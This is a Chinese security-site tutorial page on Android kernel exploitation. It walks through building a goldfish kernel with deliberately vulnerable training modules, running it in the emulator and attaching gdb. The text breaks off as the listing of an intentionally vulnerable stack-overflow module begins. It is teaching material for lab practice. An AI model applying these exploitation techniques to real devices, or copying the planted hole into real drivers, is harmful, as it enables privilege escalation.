@@ -1,0 +1,983 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】Android内核漏洞利用技术实战：环境搭建&栈溢出实战 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="Android内核漏洞"/>
+    
+        <meta name="description" content="Android的内核采用的是 Linux 内核，所以在Android 内核中进行漏洞利用其实和在 一般的 x86平台下的linux内核中进行利用差不多。主要区别在于Android下使用的是arm汇编以及环境的搭建方面。本文对我最近的实践做一个分享。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】Android内核漏洞利用技术实战：环境搭建&amp;栈溢出实战</h2>
+                <div class="article-msg">
+                    <span class="time">2017-08-14 16:22:02</span>
+                    
+                                        <span class="read">阅读：11003次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_4247"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="4247" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href=""
+                             target="_blank">来源： 安全客</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2553709124" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t011d66e4d0ee6ef2b8.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2553709124" style="color:#848e99;">for_while</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p5.qhimg.com/t0191ac07fdf8c6385f.jpg" title="t01361e0069867f27cf.jpg" alt="http://p0.qhimg.com/t01361e0069867f27cf.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">作者：</span><a href="http://bobao.360.cn/member/contribute?uid=2553709124" target="_blank"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">for_while</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">预估稿费：300RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 32px; background: white;"><span style="font-weight: 900; font-size: 18px; font-family: 微软雅黑, sans-serif; color: rgb(0, 112, 192);">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前言</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Android的内核采用的是 Linux 内核，所以在Android 内核中进行漏洞利用其实和在 一般的 x86平台下的linux内核中进行利用差不多。主要区别在于Android下使用的是arm汇编以及环境的搭建方面。本文对我最近的实践做一个分享，其实很简单</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内核调试环境搭建</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">搭建平台: &nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;&nbsp;ubuntu 16.04</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里使用android模拟器来进行内核调试。首先下载内核代码</span></p><pre class="brush:plain;toolbar:false">git&nbsp;clone&nbsp;https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish.git</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后下载github上的一个</span><a href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">安卓漏洞利用的项目</a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">，&nbsp;</span></p><pre class="brush:js;toolbar:false">git&nbsp;clone&nbsp;https://github.com/Fuzion24/AndroidKernelExploitationPlayground.git&nbsp;kernel_exploit_challenges</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后使用项目中的</span><a href="https://raw.githubusercontent.com/Fuzion24/AndroidKernelExploitationPlayground/master/kernel_build/debug_symbols_and_challenges.patch" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">patch文件</a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">把 patch 内核编译配置，来把项目中的带漏洞的模块编译进linux内核</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">git&nbsp;am&nbsp;--signoff&nbsp;&lt;&nbsp;../kernel_exploit_challenges/kernel_build/debug_symbols_and_challenges.patch&nbsp;&amp;&amp;&nbsp;\
+cd&nbsp;..&nbsp;&amp;&amp;&nbsp;ln&nbsp;-s&nbsp;$(pwd)/kernel_exploit_challenges/&nbsp;goldfish/drivers/vulnerabilities</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里注意：&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">goldfish</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">目录和 &nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">kernel_exploit_challenges</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">目录要在同一目录下</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后下载&nbsp;</span><a href="http://download.csdn.net/detail/qq_23119893/8709335" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">arm-linux-androideabi-4.6交叉编译工具链</a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;。下载完成后把它解压后，然后把它加到环境变量中</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:js;toolbar:false">tar&nbsp;xvf&nbsp;arm-linux-androideabi-4.6.tar.bz2&nbsp;
+export&nbsp;PATH=$(pwd)/arm-linux-androideabi-4.6/bin/:$PATH</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后进入&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">goldfish</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">目录，开始编译</span></p><pre class="brush:js;toolbar:false">make&nbsp;goldfish_armv7_defconfig&nbsp;&amp;&amp;&nbsp;make&nbsp;-j8</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">编译完成后，就会有两个主要的文件：</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">goldfish/vmlinux&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">和&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">goldfish/arch/arm/boot/zImage</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">。前面那个用于在调试时gdb加载，后面的用于在安卓模拟器启动时加载。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面下载 安卓sdk, 用来下载和运行 安卓模拟器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">sdk下载地址：&nbsp;</span><a href="http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz</a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后把 sdk解压</span></p><pre class="brush:js;toolbar:false">tar&nbsp;xvf&nbsp;android-sdk_r24.4.1-linux.tgz</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">把</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;android-sdk-linux/tools</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp; 加入环境变量，把下面的命令添加到&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">~/.bashrc</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;的末尾&lt;把命令中的目录改成你的目录&gt;</span></p><pre class="brush:js;toolbar:false">export&nbsp;PATH=/home/haclh/hacktools/android-sdk-linux/tools:$PATH</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后重新打开一个shell, 使用下面的命令&nbsp;&lt;要先下载jdk ,并且设置好环境变量&gt;</span></p><pre class="brush:js;toolbar:false">android</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后把下面标注的两个下载下来</span></p><p style="text-align: center;"><img src="http://p0.qhimg.com/t010f4b9cbb99343713.jpg" title="t014d9b23baabd101c9.jpg" alt="http://p0.qhimg.com/t014d9b23baabd101c9.jpg"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下载完后。首先查看下载的镜像文件</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:js;toolbar:false">$android&nbsp;list&nbsp;targets
+Available&nbsp;Android&nbsp;targets:
+----------
+id:&nbsp;1&nbsp;or&nbsp;&quot;android-19&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Name:&nbsp;Android&nbsp;4.4.2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type:&nbsp;Platform
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;API&nbsp;level:&nbsp;19
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Revision:&nbsp;4
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Skins:&nbsp;HVGA,&nbsp;QVGA,&nbsp;WQVGA400,&nbsp;WQVGA432,&nbsp;WSVGA,&nbsp;WVGA800&nbsp;(default),&nbsp;WVGA854,&nbsp;WXGA720,&nbsp;WXGA800,&nbsp;WXGA800-7in</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后创建 模拟器</span></p><pre class="brush:js;toolbar:false">android&nbsp;create&nbsp;avd&nbsp;--force&nbsp;-t&nbsp;&quot;android-19&quot;&nbsp;-n&nbsp;kernel_challenges</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后进入 goldfish 目录，使用下面的命令来使用我们的内核来运行模拟器，并在 1234 端口起一个 gdbserver 来方便进行 内核调试</span></p><pre class="brush:js;toolbar:false">emulator&nbsp;-show-kernel&nbsp;-kernel&nbsp;arch/arm/boot/zImage&nbsp;-avd&nbsp;kernel_challenges&nbsp;-no-boot-anim&nbsp;-no-skin&nbsp;-no-audio&nbsp;-no-window&nbsp;-qemu&nbsp;-monitor&nbsp;unix:/tmp/qemuSocket,server,nowait&nbsp;-s</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一次运行有类似的结果：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:js;toolbar:false">$&nbsp;emulator&nbsp;-show-kernel&nbsp;-kernel&nbsp;arch/arm/boot/zImage&nbsp;-avd&nbsp;kernel_challenges&nbsp;-no-boot-anim&nbsp;-no-skin&nbsp;-no-audio&nbsp;-no-window&nbsp;-qemu&nbsp;-monitor&nbsp;unix:/tmp/qemuSocket,server,nowait&nbsp;-s
+WARNING:&nbsp;userdata&nbsp;image&nbsp;already&nbsp;in&nbsp;use,&nbsp;changes&nbsp;will&nbsp;not&nbsp;persist!
+Creating&nbsp;filesystem&nbsp;with&nbsp;parameters:
+&nbsp;&nbsp;&nbsp;&nbsp;Size:&nbsp;576716800
+&nbsp;&nbsp;&nbsp;&nbsp;Block&nbsp;size:&nbsp;4096
+&nbsp;&nbsp;&nbsp;&nbsp;Blocks&nbsp;per&nbsp;group:&nbsp;32768
+&nbsp;&nbsp;&nbsp;&nbsp;Inodes&nbsp;per&nbsp;group:&nbsp;7040
+&nbsp;&nbsp;&nbsp;&nbsp;Inode&nbsp;size:&nbsp;256
+&nbsp;&nbsp;&nbsp;&nbsp;Journal&nbsp;blocks:&nbsp;2200
+&nbsp;&nbsp;&nbsp;&nbsp;Label:&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;Blocks:&nbsp;140800
+&nbsp;&nbsp;&nbsp;&nbsp;Block&nbsp;groups:&nbsp;5
+&nbsp;&nbsp;&nbsp;&nbsp;Reserved&nbsp;block&nbsp;group&nbsp;size:&nbsp;39
+Created&nbsp;filesystem&nbsp;with&nbsp;11/35200&nbsp;inodes&nbsp;and&nbsp;4536/140800&nbsp;blocks
+WARNING:&nbsp;cache&nbsp;image&nbsp;already&nbsp;in&nbsp;use,&nbsp;changes&nbsp;will&nbsp;not&nbsp;persist!
+Creating&nbsp;filesystem&nbsp;with&nbsp;parameters:
+&nbsp;&nbsp;&nbsp;&nbsp;Size:&nbsp;69206016
+&nbsp;&nbsp;&nbsp;&nbsp;Block&nbsp;size:&nbsp;4096
+&nbsp;&nbsp;&nbsp;&nbsp;Blocks&nbsp;per&nbsp;group:&nbsp;32768
+&nbsp;&nbsp;&nbsp;&nbsp;Inodes&nbsp;per&nbsp;group:&nbsp;4224
+&nbsp;&nbsp;&nbsp;&nbsp;Inode&nbsp;size:&nbsp;256
+&nbsp;&nbsp;&nbsp;&nbsp;Journal&nbsp;blocks:&nbsp;1024
+&nbsp;&nbsp;&nbsp;&nbsp;Label:&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;Blocks:&nbsp;16896
+&nbsp;&nbsp;&nbsp;&nbsp;Block&nbsp;groups:&nbsp;1
+&nbsp;&nbsp;&nbsp;&nbsp;Reserved&nbsp;block&nbsp;group&nbsp;size:&nbsp;7
+Created&nbsp;filesystem&nbsp;with&nbsp;11/4224&nbsp;inodes&nbsp;and&nbsp;1302/16896&nbsp;blocks
+......................
+......................
+......................</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了便于后面的操作我们需要把 交叉编译工具链 添加到环境变量里。把下面的命令添加到&nbsp;</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">~/.bashrc</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;的末尾&lt;把命令中的目录改成你的目录&gt;</span></p><pre class="brush:plain;toolbar:false">export
+PATH=/home/haclh/hacktools/arm-linux-androideabi-4.6/bin/:$PATH</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后重新开个 shell, 进入到 goldfish 目录，加载 vmlinux 以便调试内核</span></p><pre class="brush:js;toolbar:false">arm-linux-androideabi-gdb&nbsp;vmlinux</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果一切正常，应该可以得到下面的类似输出</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">GNU&nbsp;gdb&nbsp;(GDB)&nbsp;7.3.1-gg2
+Copyright&nbsp;(C)&nbsp;2011&nbsp;Free&nbsp;Software&nbsp;Foundation,&nbsp;Inc.
+License&nbsp;GPLv3+:&nbsp;GNU&nbsp;GPL&nbsp;version&nbsp;3&nbsp;or&nbsp;later&nbsp;&lt;http://gnu.org/licenses/gpl.html&gt;
+This&nbsp;is&nbsp;free&nbsp;software:&nbsp;you&nbsp;are&nbsp;free&nbsp;to&nbsp;change&nbsp;and&nbsp;redistribute&nbsp;it.
+There&nbsp;is&nbsp;NO&nbsp;WARRANTY,&nbsp;to&nbsp;the&nbsp;extent&nbsp;permitted&nbsp;by&nbsp;law.&nbsp;&nbsp;Type&nbsp;&quot;show&nbsp;copying&quot;
+and&nbsp;&quot;show&nbsp;warranty&quot;&nbsp;for&nbsp;details.
+This&nbsp;GDB&nbsp;was&nbsp;configured&nbsp;as&nbsp;&quot;--host=x86_64-apple-darwin&nbsp;--target=arm-linux-android&quot;.
+For&nbsp;bug&nbsp;reporting&nbsp;instructions,&nbsp;please&nbsp;see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
+Reading&nbsp;symbols&nbsp;from&nbsp;&lt;REDACTED&gt;/goldfish/vmlinux...done.
+(gdb)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后连接 模拟器里面的 调试端口</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">(gdb)&nbsp;target&nbsp;remote&nbsp;:1234
+Remote&nbsp;debugging&nbsp;using&nbsp;:1234
+cpu_v7_do_idle&nbsp;()&nbsp;at&nbsp;arch/arm/mm/proc-v7.S:74
+74movpc,&nbsp;lr
+(gdb)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果能看到这样的输出说明已经可以正常进行内核调试了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内核栈溢出漏洞利用&nbsp; &nbsp; &nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先看看漏洞代码，</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;kernel_exploit_challenges/challenges/stack_buffer_overflow/module/stack_buffer_overflow.c</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">:</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#include&nbsp;&lt;linux/module.h&gt;
+#include&nbsp;&lt;linux/kernel.h&gt;
+#include&nbsp;&lt;linux/init.h&gt;
+#include&nbsp;&lt;linux/proc_fs.h&gt;
+#include&nbsp;&lt;linux/string.h&gt;
+#include&nbsp;&lt;asm/uaccess.h&gt;
+#define&nbsp;MAX_LENGTH&nbsp;64
+MODULE_LICENSE(&quot;GPL&quot;);
+MODULE_AUTHOR(&quot;Ryan&nbsp;Welton&quot;);
+MODULE_DESCRIPTION(&quot;Stack&nbsp;Buffer&nbsp;Overflow&nbsp;Example&quot;);
+static&nbsp;struct&nbsp;proc_dir_entry&nbsp;*stack_buffer_proc_entry;
